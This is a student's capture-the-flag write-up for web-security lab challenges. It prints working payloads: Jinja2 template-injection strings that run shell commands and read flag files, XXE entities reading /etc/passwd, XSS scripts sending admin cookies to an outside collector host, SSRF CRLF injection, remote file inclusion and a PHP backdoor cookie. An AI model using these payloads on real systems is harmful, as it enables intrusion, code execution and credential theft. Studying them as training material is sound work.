# Web Security writeup
by Ka Po Chau

# ssti
By following [this guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), I was able to check the ssti injection and confirmed that it is python jinja2.
> {{7*'7'}} = 7777777
> 
> {{foobar}} = Nothing

## ssti1
just using `{{config}}` I was able to find the flag inside it.

## ssti2
[Detailed steps](https://secure-cookie.io/attacks/ssti/) to the ssti attack. I had to first find the number of `warnings.catch_warnings` with 
```
{{ "foo".__class__.__base__.__subclasses__() }}
```
It is 305th line, which means I can then do:
```
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[305].__init__.__globals__['sys'].modules['os'].popen("cat flag.txt").read() }}
```
and got the flag from `flag.txt`.

## ssti3
Same as ssti2 except `warnings.catch_warnings` is at 299.

```
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
{{ "foo".__class__.__base__.__subclasses__()[299].__init__.__globals__['sys'].modules['os'].popen("./getFlag").read() }}
```

## ssti 4
I was unable to solve this challenge, tried to do an ls that showed:
```
app.py
config.py
docker-compose.yml
index.html
```
and read the docker-compose.yml, but could not get the port of the old docker container. nmap scan showed 1 ssh port and 2 html ports, but could not figure out a way to attack. Also tried to reverse shell with ncat but was not working.


# graphql Confessions
Following [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql) I was able to query the graphql database. This was my steps:
```
https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{types{name,fields{name}}}}
```
got the database schema, letting me know how to request confession logs:
```
https://confessions.secu-web.blackfoot.dev/graphql?query={requestsLog{%20name,%20args}}
```
after realizing that graphql makes a separate confession log for EACH character entered, I was able to bruteforce the full flag starting from log #0 with [sha256 hash generator](https://www.miraclesalad.com/webtools/sha256.php) and checking the result of each character.


# ssrf
Detailed steps [here](http://voisin.iiens.net/FIC.html) I first tried many different combinations like `127.0.0.1` and `127.0.00.1/secret` but they did not work.
I realize it is because the server automatically added `http://` to the beginning and port `:80` to the end of my input.
I then used `127.0.00.1/secret?` with the `?` to escape the `:80`.
This worked but then gave me another error:
```
{"ok":false,"message":"Missing GOSESSION ... You are not connected... get away !","flag":""}
```
I then query the `/host` instead and gave it the parameter to query `/secret`. With 2 redirections I was able to get the flag.

What I used in the end:
```
127.00.0.1/host?host=127.0.00.1/secret?%20HTTP/1.1%0D%0ACookie:%20GOSESSION=guest-go1.11.5
```
Which is then [decoded](https://www.base64decode.org/) for the flag.

# xxe
## xxe1
Just by inspecting `main.js` and directly editing it on chrome, I was able to get the flag with xxe injection.
In the html file was already a hidden clue `<!-- // include_once('flag.php'); -->` We know there is a `flag.php`.
What I added to `main.js` below `<?xml version="1.0"?>`:
```
      <!DOCTYPE foo [ 
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
      ]>
```
Then I entered `&ac;` as message.

## xxe2
Same except this time the result is not displayed so it is a blind xxe. But by checking `index.php`, we know that error is still displayed!
```
        $message = "Thanks for your message: '$msg'";
    } catch (Exception $e) {
        $message = "Issue with the message: $e";
    }
```
^ This is how xxe1 looks like
```
        $message = "Thanks for your message :)";
    } catch (Exception $e) {
        $message = "Issue with the message: $e";
    }
```
^ This is how xxe2 looks like.

So then I just used error display instead to get the result of `flag.php`.
This is what I entered:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php"> %xxe; ]>
```
Got flag from error message.

# obfuscation
## OBF100
Very easy. Just by reading the javascript I was able to [decode the password](https://deobfuscate.io/).
```
var _0xf7f7=["\x67\x67\x65\x7A","\x45\x6E\x74\x65\x72\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x20\x3A\x20","\x70\x72\x6F\x6D\x70\x74","\x43\x6F\x6E\x67\x72\x61\x74\x73\x20\x21\x20\x59\x6F\x75\x20\x63\x61\x6E\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x20\x74\x68\x69\x73\x20\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x20\x77\x69\x74\x68\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x20\x42\x43\x53\x7B","\x7D","\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x20\x6D\x61\x6E\x20\x3F\x20\x47\x65\x74\x20\x79\x6F\x75\x72\x20\x73\x68\x69\x74\x20\x74\x6F\x67\x65\x74\x68\x65\x72\x2E\x20\x51\x75\x69\x63\x6B\x6C\x79\x2E"];var password=_0xf7f7[0];var input=window[_0xf7f7[2]](_0xf7f7[1]);if(password=== input){alert(_0xf7f7[3]+ input+ _0xf7f7[4]);}else {alert(_0xf7f7[5]);}
```
decodes into:
```
var password = "ggez";
```
## script_kidding
Very difficult, mostly due to lack of information on the internet apart from 1 stackoverflow [thread](https://wordpress.stackexchange.com/questions/362935/is-this-code-malidcous).

It is a cookie hack backdoor. By reading the decoded php and reversing the required input, I was able to use an accepted cookie to crack it.

```
a:2:{s:2:"ak";s:2:"hi";s:1:"a";s:1:"i";}
```
This is the first cookie I needed to use to confirm it works. This is a seriallized array that the backdoor needs, according to the php it needs array with input['ak'] exists and input['a']='i'.

I was able to encode it by reversing the backdoor's own decoding system! Took a full day but great success.

The backdoor's salt: `4ef63abe-1abd-45a6-913d-6fb99657e24b`

I had to reverse the decode function to figure out how to encode my cookie.

This is the full dictionary I got, from trial and error everything:
```
" = Iq..
' = J2..
( = KA..
) = Ka..
. = Lq..
/ = L2..
: = Oq..
; = O2..
_ = X2..
{ = e2..
} = fa..
a = Ya..
b = Yq..
c = Y2..
d = ZA..
e = Za..
f = Zq..
g = Z2..
h = aA..
i = aa..
j = aq..
k = a2..
l = bA..
m = ba..
n = bq..
o = b2..
p = cA..
q = ca..
r = cq..
s = c2..
t = dA..
u = da..
v = dq..
w = d2..
x = eA..
y = ea..
z = eq..
0 = MA..
1 = Ma..
2 = Mq..
3 = M2..
4 = NA..
5 = Na..
6 = Nq..
7 = N2..
8 = OA..
9 = Oa..
```

After that I was able to write a working cookie.

Confirming that it works, I then wrote a cookie to scan directory:
```
a:3:{s:2:"ak";s:2:"hi";s:1:"a";s:1:"e";s:1:"d";s:23:"print_r(scandir('./'));";}
```
which gave me the directory listing and I was able to find the hidden file.

# xxs

## whatsup
After reading a lot of [guides](https://ironhackers.es/tutoriales/csrf-xss-filter-bypass/) I first tried simple injection:
```
<SCrIpT>alert(1)</SCrIpT>
```
it worked!
We know the admin is checking messages every minute. So admin will run whatever code I injected as well.
So then I tried another injection, with [pipedream](https://pipedream.com/) I opened a new pipe to check any incoming requests.
```
<SCrIpT>var x1=new XMLHttpRequest(); x1.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=test", false); x1.send()</SCrIpT>
```
it also worked! my pipdream line got 2 requests from myself and the admin `client ip: 35.242.202.31`.
```
<SCRIPT>var x1=new XMLHttpRequest(); x1.open("GET", "/messages", false); x1.send();var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=" + btoa(unescape(x1.responseText)), false); x2.send();</SCrIpT>
```
With using this I was able to spy on admin's messages page and see their messages. But it was useless, flag was not there.
I was very very confused. I was sure the flag is somewhere in the admin's messages.
I thought no way it is admin's cookie, because my own cookies from this website is `HttpOnly`. It is uncrackable. So I thought admin's cookie would be the same and that cookies is not the way to go. `document.cookie` on myself is empty.
But I decided to try anyway after a while.
```
<SCRIPT>var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=f_" + document.cookie, false);  x2.send();</SCrIpT>
```
Somehow the admin's cookie is NOT `HttpOnly` and it is the flag. Shrug

## whatsup2
Very easy after whatsup1. Same thing except messages are sanitized so cannot be injected. But the image link is not, so we can inject there still.
What I entered for the image:
```
1" onerror="var x2=new XMLHttpRequest(); x2.open('GET', 'https://eo2awd21wqscuhf.m.pipedream.net/?1=f_' + document.cookie, false);  x2.send();
```

# jwt
## mythique1
No signature checking. We literally just changed the cookie via https://dinochiesa.github.io/jwt/ and it worked.

## mythique2
By reading [this](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac) I know there is vulnerability of using RS256 public key to craft a HS256 working signature.
So by using [TokenBreaker](https://github.com/cyberblackhole/TokenBreaker) I was able to make a new jwt with:
```
python RsaToHmac.py -t *** -p ***
```

## mythique3
Reading [this guide (Chinese)](https://si1ent.xyz/2020/10/21/JWT%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AE%9E%E6%88%98/) inspired me. The signature is HS256 and short which means it can be bruteforced.
So by using [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) I was able to bruteforce secret.
![image](https://user-images.githubusercontent.com/43685348/221394412-fb4f3a8b-9097-45e1-94df-63ce717ec2f1.png)
Then I just used secret to generate working jwt.

# sqli
## potionseller
Detailed steps [here](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf) to SQL injection.

First I tried 3+1, 5-1, neither worked to get 4.

Then by using union select, I was able to union and order by descending price.
```
https://potionseller.secu-web.blackfoot.dev/potions/1%20union%20select%20id,name,description,price,img,longdescription%20from%20potions%20order%20by%20price%20desc
```
Side note using bitwise operation worked also somehow.
```
https://potionseller.secu-web.blackfoot.dev/potions/2%3C%3C1
```

## potionseller2
I was not able to do this question. SQL injection on the potions side is now blocked, and the admin login I could not do any injection whatsoever. I even used SQL injection detection tools to auto crack it but no dice.
Time based blind attack did not work neither. It did not wait any time when I tried.
I think there must be some sort of input cleaning WAF that I am not able to get past.

# lfi
## no protection
just do `https://noprotection.secu-web.blackfoot.dev/index.php?lang=flag.html`.

## extprotect
just do `https://extprotect.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config`. Then [decode](https://www.base64decode.org/) the answer.

## filters
Detailed explation [here](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html).
By reading the source we know there is a `config.php`.
Then I just did a `https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php`.

## remote
lfi explation [here](https://medium.com/blacksecurity/metasploitable-dvwa-lfi-rfi-b4054760e1b9). We know that we can make the website include [my own php file](https://remote.secu-web.blackfoot.dev/index.php?lang=https://moonlit-nature-343717.web.app/test.txt).
What's in the php file:
```
<?php
passthru("ls")
?>
```
Now we find the hidden file via `ls`.

# auth
## auth50
whats this? just admin password.
